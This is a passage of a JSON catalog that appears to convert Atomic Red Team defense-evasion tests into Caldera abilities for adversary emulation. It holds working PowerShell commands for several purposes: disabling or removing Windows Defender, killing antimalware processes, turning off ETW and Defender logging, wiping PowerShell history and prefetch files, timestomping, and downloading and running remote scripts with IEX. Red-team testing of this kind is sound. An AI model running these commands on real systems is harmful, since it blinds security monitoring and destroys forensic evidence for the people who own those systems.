        "description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "afae914d4839d5194835d8475604e7b8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "afae914d4839d5194835d8475604e7b8"
    },
    "T1218.001__defense-evasion__Signed Binary Proxy Execution: Compiled HTML File__627f499ceb32e74b95494141bc680e08": {
        "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "627f499ceb32e74b95494141bc680e08",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "627f499ceb32e74b95494141bc680e08"
    },
    "T1070.008__defense-evasion__Email Collection: Mailbox Manipulation__9d03b18c922b94ebba44d25c430e6e95": {
        "description": "Copies and deletes mail data on Windows\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.008",
            "name": "Email Collection: Mailbox Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore",
                    "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }; Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9d03b18c922b94ebba44d25c430e6e95",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9d03b18c922b94ebba44d25c430e6e95"
    },
    "T1562.006__defense-evasion__Impair Defenses: Indicator Blocking__233bd007622d94ee3019efc6a70d0a83": {
        "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets",
                    "command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "233bd007622d94ee3019efc6a70d0a83",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "233bd007622d94ee3019efc6a70d0a83"
    },
    "T1553.004__defense-evasion__Subvert Trust Controls: Install Root Certificate__9d21f3b551b40fa40056af1244af56ee": {
        "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.004",
            "name": "Subvert Trust Controls: Install Root Certificate"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item",
                    "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9d21f3b551b40fa40056af1244af56ee",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9d21f3b551b40fa40056af1244af56ee"
    },
    "T1218__defense-evasion__Signed Binary Proxy Execution__7802ee02cf34e0e7cbee64ee22a79b8d": {
        "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7802ee02cf34e0e7cbee64ee22a79b8d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7802ee02cf34e0e7cbee64ee22a79b8d"
    },
    "T1036__defense-evasion__Masquerading__bc456ce28da22e33b96257b6ae020391": {
        "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036",
            "name": "Masquerading"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue",
                    "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"; start-process \"$env:allusersprofile\\cmd.exe\"; sleep -s 5 ; stop-process -name \"cmd\" | out-null",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bc456ce28da22e33b96257b6ae020391",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bc456ce28da22e33b96257b6ae020391"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__55fa0d4a61d03d34c0628b6b5343cac7": {
        "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n MsMpEng.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "55fa0d4a61d03d34c0628b6b5343cac7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "55fa0d4a61d03d34c0628b6b5343cac7"
    },
    "T1070.003__defense-evasion__Indicator Removal on Host: Clear Command History__adce11c81bb77ae74660c6c743a0442d": {
        "description": "Clears Powershell history\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.003",
            "name": "Indicator Removal on Host: Clear Command History"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item (Get-PSReadlineOption).HistorySavePath",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "adce11c81bb77ae74660c6c743a0442d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "adce11c81bb77ae74660c6c743a0442d"
    },
    "T1564__defense-evasion__Hide Artifacts__b7f89af9214876eae185527350ca034f": {
        "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564",
            "name": "Hide Artifacts"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore",
                    "command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\"); $macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7f89af9214876eae185527350ca034f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b7f89af9214876eae185527350ca034f"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__c087fa2d3870144b9fd442f476e7768a": {
        "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'CheckIfInstallable'; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "c087fa2d3870144b9fd442f476e7768a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c087fa2d3870144b9fd442f476e7768a"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__b26ce33f4cd29428f619fc600e052350": {
        "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_HelpText_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "b26ce33f4cd29428f619fc600e052350",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b26ce33f4cd29428f619fc600e052350"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__79cb459770a15ea9e56b874d62bf8319": {
        "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "79cb459770a15ea9e56b874d62bf8319",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "79cb459770a15ea9e56b874d62bf8319"
    },
    "T1562.006__defense-evasion__Impair Defenses: Indicator Blocking__54ef63765cf80243f370958bcf738338": {
        "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.006",
            "name": "Impair Defenses: Indicator Blocking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "54ef63765cf80243f370958bcf738338",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "54ef63765cf80243f370958bcf738338"
    },
    "T1218.009__defense-evasion__Signed Binary Proxy Execution: Regsvcs/Regasm__78931aaa8e328d30a3e47f61e2899b3b": {
        "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.009",
            "name": "Signed Binary Proxy Execution: Regsvcs/Regasm"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $Env:TEMP\\T1218.009.dll -ErrorAction Ignore | Out-Null; $parentpath = Split-Path -Path \"$Env:TEMP\\T1218.009.dll\"; Remove-Item $parentpath\\key.snk -ErrorAction Ignore | Out-Null; Remove-Item $parentpath\\T1218.009.tlb -ErrorAction Ignore | Out-Null",
                    "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='; $Content = [System.Convert]::FromBase64String($key); Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1218.009.dll\" /target:library /keyfile:$env:Temp\\key.snk aaaa08_T1218.009.cs; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1218.009.dll",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "aaaa08_T1218.009.cs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "78931aaa8e328d30a3e47f61e2899b3b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "78931aaa8e328d30a3e47f61e2899b3b"
    },
    "T1027__defense-evasion__Obfuscated Files or Information__b62952c5352ee68c1340feb08a5a02a1": {
        "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; powershell.exe -EncodedCommand $EncodedCommand",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b62952c5352ee68c1340feb08a5a02a1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b62952c5352ee68c1340feb08a5a02a1"
    },
    "T1070.004__defense-evasion__Indicator Removal on Host: File Deletion__2413b013bc82d152765e2ac34601a327": {
        "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2413b013bc82d152765e2ac34601a327",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2413b013bc82d152765e2ac34601a327"
    },
    "T1070.005__defense-evasion__Indicator Removal on Host: Network Share Connection Removal__6940ffd670787cd1c410997e66629573": {
        "description": "Removes a Network Share utilizing PowerShell\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.005",
            "name": "Indicator Removal on Host: Network Share Connection Removal"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-SmbShare -Name \\\\test\\share; Remove-FileShare -Name \\\\test\\share",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6940ffd670787cd1c410997e66629573",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6940ffd670787cd1c410997e66629573"
    },
    "T1218.005__defense-evasion__Signed Binary Proxy Execution: Mshta__bf9cc3d98c38f79c948a0f4a7f888034": {
        "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bf9cc3d98c38f79c948a0f4a7f888034",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "bf9cc3d98c38f79c948a0f4a7f888034"
    },
    "T1070.003__defense-evasion__Indicator Removal on Host: Clear Command History__df94858e92a23d274ac1d70133d9150f": {
        "description": "Prevents Powershell history\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.003",
            "name": "Indicator Removal on Host: Clear Command History"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally",
                    "command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "df94858e92a23d274ac1d70133d9150f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "df94858e92a23d274ac1d70133d9150f"
    },
    "T1070.006__defense-evasion__Indicator Removal on Host: Timestomp__68ce066d07960123ccd981dd8c38a7c1": {
        "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "68ce066d07960123ccd981dd8c38a7c1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
